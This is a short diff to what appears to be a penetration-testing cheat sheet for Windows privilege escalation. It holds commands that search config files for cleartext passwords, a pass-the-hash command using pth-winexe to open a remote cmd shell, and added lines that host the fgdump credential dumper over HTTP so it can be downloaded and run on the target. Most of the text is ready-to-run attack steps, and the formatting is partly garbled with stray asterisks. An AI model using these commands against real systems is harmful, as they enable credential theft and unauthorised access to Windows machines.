@@ -106,6 +106,8 @@ EoP3: ClearText passwords (quick hits)
 findstr /si password *.xml
 findstr /si password *.ini*
     Pass The Hash allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a cleartext password.
+    * $ cd /usr/share/windows-binaries/fgdump; python -m SimpleHTTPServer 80*
+    Download and run fgdump.exe on the target machine.
     *$ pth-winexe -U hash //$ip cmd*
 
     Find all those strings in config files.
